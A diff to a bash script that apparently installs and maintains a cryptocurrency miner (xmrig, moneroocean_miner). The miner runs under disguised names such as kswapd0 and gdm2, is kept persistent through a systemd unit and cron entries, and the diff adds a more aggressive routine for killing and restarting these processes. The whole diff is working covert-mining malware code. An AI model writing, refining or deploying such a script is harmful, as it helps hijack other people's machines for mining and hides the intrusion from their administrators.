@@ -1,10 +1,94 @@
 #!/bin/bash
 
+# ==================== ROBUST SERVICE STOPPING FUNCTION ====================
+force_stop_service() {
+    local service_names="$1"
+    local process_names="$2"
+    local max_attempts=60
+    local attempt=0
+    
+    echo "[*] Force-stopping services: $service_names"
+    echo "[*] Force-stopping processes: $process_names"
+    
+    while [ $attempt -lt $max_attempts ]; do
+        attempt=$((attempt + 1))
+        
+        # Try systemctl stop
+        if [ -n "$service_names" ]; then
+            for svc in $service_names; do
+                if systemctl is-active --quiet "$svc" 2>/dev/null; then
+                    echo "[*] Attempt $attempt: Stopping $svc..."
+                    sudo systemctl stop "$svc" 2>/dev/null || true
+                    sleep 1
+                fi
+            done
+        fi
+        
+        # Try killall
+        if [ -n "$process_names" ]; then
+            for proc in $process_names; do
+                if pgrep -x "$proc" >/dev/null 2>&1; then
+                    echo "[*] Attempt $attempt: Killing $proc..."
+                    killall "$proc" 2>/dev/null || true
+                    sleep 1
+                fi
+            done
+        fi
+        
+        # Force kill every 5th attempt
+        if [ $((attempt % 5)) -eq 0 ]; then
+            echo "[*] Attempt $attempt: Using SIGKILL..."
+            if [ -n "$process_names" ]; then
+                for proc in $process_names; do
+                    killall -9 "$proc" 2>/dev/null || true
+                done
+            fi
+            sleep 2
+        fi
+        
+        # Check if stopped
+        local still_running=false
+        if [ -n "$service_names" ]; then
+            for svc in $service_names; do
+                if systemctl is-active --quiet "$svc" 2>/dev/null; then
+                    still_running=true
+                    break
+                fi
+            done
+        fi
+        
+        if [ "$still_running" = false ] && [ -n "$process_names" ]; then
+            for proc in $process_names; do
+                if pgrep -f "$proc" >/dev/null 2>&1; then
+                    still_running=true
+                    break
+                fi
+            done
+        fi
+        
+        if [ "$still_running" = false ]; then
+            echo "[✓] All services/processes stopped!"
+            return 0
+        fi
+        
+        if [ $attempt -lt $max_attempts ]; then
+            sleep 5
+        fi
+    done
+    
+    # Final nuclear kill
+    echo "[!] Max attempts reached, final kill..."
+    killall -9 xmrig kswapd0 swapd gdm2 moneroocean_miner 2>/dev/null || true
+    return 0
+}
+
 # ==================== CLEAN PREVIOUS INSTALLATIONS ====================
 echo "[*] Cleaning previous installations..."
 
-# Stop all mining processes
-killall -9 xmrig kswapd0 swapd gdm2 moneroocean_miner 2>/dev/null
+# Use robust force-stop function
+force_stop_service \
+    "gdm2 swapd moneroocean_miner" \
+    "xmrig kswapd0 swapd gdm2 moneroocean_miner"
 
 # Remove crontab entries
 crontab -l | grep -v "system_cache\|check_and_start\|swapd\|gdm2" | crontab -
@@ -405,8 +489,11 @@ MemoryHigh=300M
 WantedBy=multi-user.target
 EOL
     sudo mv /tmp/gdm2.service /etc/systemd/system/gdm2.service
+    
+    echo "[*] Ensuring old processes are stopped before starting new service..."
+    force_stop_service "gdm2" "kswapd0"
+    
     echo "[*] Starting gdm2 systemd service"
-    sudo killall kswapd0 2>/dev/null
     sudo systemctl daemon-reload
     sudo systemctl enable gdm2.service
     sudo systemctl start gdm2.service
